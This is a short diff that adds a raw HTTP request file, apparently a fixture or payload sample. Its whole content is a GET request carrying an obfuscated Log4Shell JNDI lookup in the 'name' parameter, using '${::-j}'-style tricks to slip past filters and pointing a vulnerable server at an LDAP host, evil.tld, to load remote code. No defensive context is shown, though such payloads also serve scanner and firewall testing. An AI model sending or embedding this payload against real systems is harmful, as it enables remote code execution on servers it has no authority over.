@@ -1,0 +1,4 @@
+GET /a?name='${${::-j}ndi:${::-l}dap://evil.tld/x}' HTTP/1.1
+Host: demo.example.com
+Connection: close
+
